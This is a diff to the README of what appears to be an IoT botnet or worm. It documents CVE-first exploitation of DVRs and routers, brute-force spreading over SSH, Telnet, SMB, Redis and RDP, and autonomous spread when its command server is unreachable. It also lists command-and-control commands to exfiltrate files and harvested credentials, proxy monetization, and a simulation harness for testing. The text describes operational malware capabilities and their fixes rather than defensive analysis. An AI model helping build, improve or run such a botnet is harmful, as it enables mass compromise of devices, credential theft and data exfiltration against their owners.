@@ -77,12 +77,18 @@ CVE-first: known-CVE exploitation modules run before brute-force spreaders in
 every scan/spread dispatch. Default-credential Telnet brute-force is demoted to
 a fallback vector — it only runs when no CVE module fires.
 
+**Autonomous spread** is live: when the bot has no reachable C2 on ANY channel
+(IRC, HTTP, or WebSocket — the gate is live connection state, not the
+config-enabled bitmask), the main loop falls back to `spread_local()`, which
+runs a threaded scan over the configured subnet and spreads on its own. A bot
+with a live C2 waits for operator commands instead.
+
 | Target  | Method |
 |---------|--------|
 | IoT/edge (CVE-first) | Known-CVE exploitation modules with probe → verify → payload-drop phases: CVE-2024-3721 (TBK DVR-4104/4216), CVE-2017-17215 (Huawei HG532), CVE-2021-35395 (Realtek Jungle SDK) — primary vector |
 | SSH     | Password brute-force, post-exploitation payload deployment (banner-based; fallback vector, effective against legacy/test services, not modern key-exchange SSH) |
 | Telnet  | Default-credential password brute-force, post-exploitation payload deployment (banner-based; **FALLBACK** vector — demoted from primary, effective against legacy/test services) |
-| SMB     | Login brute-force (auth confirmation only; fallback) |
+| SMB     | Login brute-force + payload deploy to ADMIN$ share (fallback; the deploy path was fixed in #109 — it previously always failed on a NULL response buffer) |
 | Redis   | Unauthenticated write + authenticated brute-force, SSH key injection (`redis_ssh_key` required; fallback) |
 | RDP     | Brute-force, credential reuse (auth confirmation only; fallback) |
 
@@ -112,7 +118,10 @@ placeholder is rejected.
 
 1. Direct binary download from C2 (preferred), verified by a SHA-256 pin
    (`payload_sha256=` config / `NOTNET_PAYLOAD_SHA256` env). Update is refused
-   without a pin or on hash mismatch (fail-closed).
+   without a pin or on hash mismatch (fail-closed). Install writes the
+   verified binary to the persistent path (`get_persist_path()`) and skips
+   the copy when the source already IS that path — a self-copy that truncated
+   every update to zero bytes was removed (#108).
 2. On-target compilation (fallback, when binary download fails or the binary
    pin mismatches):
    - The bot fetches the source bundle from the C2 (`payload_source_url=`,
@@ -341,14 +350,16 @@ where one affiliate's takedown does not kill the fleet.
 ## Commands
 
 Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
-shared secret). The command queue is rate-limited to 10 commands/second.
+shared secret). The command queue is rate-limited to 10 commands/second;
+excess commands are **deferred** (compacted to the queue front and processed
+next second), never dropped (#107).
 
 | Command | Syntax | Status |
 |---------|--------|--------|
-| spread  | `spread <ip>:<port>` | Implemented — CVE-first: run known-CVE modules for the port, then brute-force fallback (22/23/445/6379/3389) |
+| spread  | `spread <ip>:<port>` / `spread <subnet>` | Implemented — CVE-first: run known-CVE modules for the port, then brute-force fallback (22/23/445/6379/3389). A subnet arg (`spread 10.0.0.0/24`) runs the threaded CVE-first spreader over the whole range |
 | scan    | `scan <subnet>` / `scan <ip>[:<port,...>]` | Implemented — port scan / service fingerprinting, results returned to C2 |
 | exec    | `exec <command>` | Implemented — runs one of a strict allowlist (`uname`, `date`, `uptime`, `whoami`, `id`, `ls`, `ifconfig`, `hostname`, `netstat`, `ps`), no shell |
-| download | `download <url> [path]` | Implemented — fetch URL to a local path |
+| download | `download <url> [path]` | Implemented — fetch URL to a local path. http:// only — https is rejected explicitly (the default build has no TLS; it previously silently fell back to the C2 path, #111) |
 | upload  | `upload <path> [remote_path]` | Implemented — upload a file to the C2 |
 | exfil   | `exfil <path>` | Implemented — read a file and stream it to the C2 in chunks |
 | exfil_creds | `exfil_creds` | Implemented — stream the buffered credential-log harvest (successful brute-force creds) to the C2 in chunks, then clear the buffer |
@@ -498,6 +509,8 @@ OpenSSL headers + `-lssl -lcrypto`.
 
 ## Testing
 
+### Docker mock harness
+
 The repo ships a Docker-based test harness:
 
 ```sh
@@ -510,6 +523,37 @@ The mock scenario verifies IRC and HTTP command extraction, the shared-secret
 auth gate, exec allowlist execution, and spread dispatch. Rebuild the Docker
 image after any source change (`docker compose -f docker-compose.test.yml
 build bot-mock-c2`).
+
+### Full-network simulation (tests/sim)
+
+`tests/sim/` is a full simulation harness that runs the REAL compiled binary
+against a heterogeneous fleet (50+ device containers: IoT, DVRs, routers,
+cameras, NAS, switches/APs, Windows PCs, Redis, Cowrie honeypots) and a
+scriptable C2, verifying every README claim end-to-end:
+
+```sh
+cd tests/sim
+./run-sim.sh --scenario all --posture standard    # full run
+./run-sim.sh --scenario c2-drive                  # operator-driven spread
+./run-sim.sh --scenario autonomous                # autonomous spread (C2 down)
+./run-sim.sh --scenario remaining-parity          # IRC C2, SOCKS5 traffic,
+                                                  #   persistence, payload pinning
+./run-sim.sh --scenario monetization              # proxy + relay
+./run-sim.sh --scenario defence --posture hardened  # IDS/lockout/EDR + host firewall
+```
+
+Scenarios covered (see `tests/sim/PARITY-MATRIX.md`): CVE modules against
+legacy devices, CVE fail-safe on patched devices, cross-vendor no-false-positive
+(probes must NOT fire on a non-matching vendor), SSH/Telnet/SMB/Redis brute-force
+tier separation, payload drops + infection propagation, IRC-only C2 channel,
+real SOCKS5 proxied traffic, persistence across reboot, payload SHA-256 pinning
+(valid accepted / tampered refused), fast-flux, dead-drop, C2 rotation, proxy
+and relay, and the defence envelope (host firewall via DOCKER-USER, IDS, lockout,
+EDR).
+
+The driver exits non-zero on any FAIL row, and `.github/workflows/sim.yml` wires
+it into CI: a `smoke` job (c2-drive) on every PR and a `full` job (all
+scenarios) nightly — so a regressed README claim fails the build.
 
 ## License
 
